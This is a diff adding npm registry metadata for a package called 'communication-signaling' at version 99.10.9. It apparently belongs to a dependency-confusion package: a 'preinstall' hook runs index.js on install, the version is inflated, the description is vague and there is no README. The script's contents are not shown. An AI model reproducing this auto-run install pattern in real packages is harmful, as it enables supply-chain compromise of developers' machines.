@@ -1,0 +1,62 @@
+{
+    "_id": "communication-signaling",
+    "name": "communication-signaling",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "communication-signaling",
+            "version": "99.10.9",
+            "description": "azbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "communication-signaling@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-tQep8fLnHsxR+hEYeC1CQdODPvl2y4WMMrBIf6Esq56AK55EaY6WN4JrqU5UQBSYaA0PN7RECjV8RIAqxz2wzg==",
+                "shasum": "ed7576ef8b6603226c9ee0a84ea0f65353deb6de",
+                "tarball": "https://registry.npmjs.org/communication-signaling/-/communication-signaling-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5075,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPMADACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpDRg/7BGR6tDzFO+tGAQydWx3TIMh6GOd1lvi2pYmR72ERgF9y7ht4\r\nYYPsD9jjEjbcfWysclUjblHKviQlH3kJFyrkZeOZMj8hhtIPg1pvX5M10ZY0\r\noVdFhZ0mpuGcQm2eHY2jIbFdr3gF6H2fx5BkY55rlPBd2yX1HTjybPh+cqJ0\r\nOCyDmtNSW3aGI4wiojGR9sMtCX8xl6llgjvJjjdyrfNXql98ulkjTz+yirOl\r\nFp5trP073B1bhY6fHXJStM58gRXm7zm7mAPmtwqsCw7CysTzz2vexDM8BMov\r\n4W024D72uQPfpkj8VrmXNMKfm9zJm9xiwym68CnbLxsV7rLt2mV31pUk6GUm\r\nf4DkOKTRagnCwplMK49Yj6v1XjVTNRP3ojV9oSj6HXQC93MOof/LMXOij91Y\r\nVW/00JszwMKIPY6rAYWhxx+qmZoWh70MEclBRZ3LukXwqE42NAxuCx4wx5oh\r\nzYQ+dFsJQ/1iPRqKYNdDMDqD3Vigpilt6Ho0K+B/DcCvY6p50xnjTECAgHIp\r\nAaLmTjjlBj837JGJS24bwrfZ640+jyuqn+qnYW40M2iXRq5kV6koL0cKXi/i\r\n6O6hSUflmdAD70j1gJzq1yCNTZVnEP5uA4E3l2MjMw4iurn+PTQimg+ukF+/\r\nNGbGFU9S3qq4z+/VjCyHZnQQhAs1CQWaSZI=\r\n=c6jS\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "xl1lcuuu",
+                "email": "xl1lcuuu@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "xl1lcuuu",
+                    "email": "xl1lcuuu@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/communication-signaling_99.10.9_1648148483199_0.2961802557937494"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T19:01:23.199Z",
+        "99.10.9": "2022-03-24T19:01:23.347Z",
+        "modified": "2022-03-24T19:01:23.444Z"
+    },
+    "maintainers": [
+        {
+            "name": "xl1lcuuu",
+            "email": "xl1lcuuu@rt11.ml"
+        }
+    ],
+    "description": "azbit package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
